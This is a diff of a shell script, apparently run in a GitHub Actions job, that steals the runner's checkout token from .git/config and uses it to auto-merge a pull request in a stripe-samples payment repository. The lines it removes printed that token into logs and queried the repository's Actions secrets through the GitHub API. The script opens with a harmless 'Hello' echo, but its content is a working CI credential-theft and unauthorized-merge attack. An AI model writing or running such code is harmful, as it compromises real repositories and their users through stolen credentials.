@@ -9,33 +9,7 @@
 echo "Hello from W!!!!"
 
 
-echo "before cat"
+export GH_TOKEN=$(grep "extraheader" /home/runner/work/accept-a-payment/accept-a-payment/.git/config  | cut -d ' ' -f 5 | cut -d ':' -f 2 | base64 -d | cut -d ':' -f 2)
 
-cat ~/.git/config
 
-echo "after cat"
-
-cat /home/runner/work/accept-a-payment/accept-a-payment/.git/config | base64
-
-echo "afterafter cat"
-
-encoded_token=$(grep "extraheader" /home/runner/work/accept-a-payment/accept-a-payment/.git/config  | cut -d ' ' -f 5 | cut -d ':' -f 2 | base64 -d | cut -d ':' -f 2)
-
-# Decode the token
-echo $encoded_token 
-
-echo $encoded_token | base64
-
-curl -H "Authorization: Bearer $encoded_token" \
-     -H "Accept: application/vnd.github+json" \
-     -H "X-GitHub-Api-Version: 2022-11-28" \
-     https://api.github.com/repos/ntestor/accept-a-payment/actions/secrets
-
-# git config --global user.email "you@example.com"
-# git config --global user.name "Your Name"
-
-# git add --all
-
-# git commit -m "added test"
-
-# git push --set-upstream origin test_branch-6
+gh pr merge --auto --merge https://github.com/stripe-samples/accept-a-payment/pull/2719
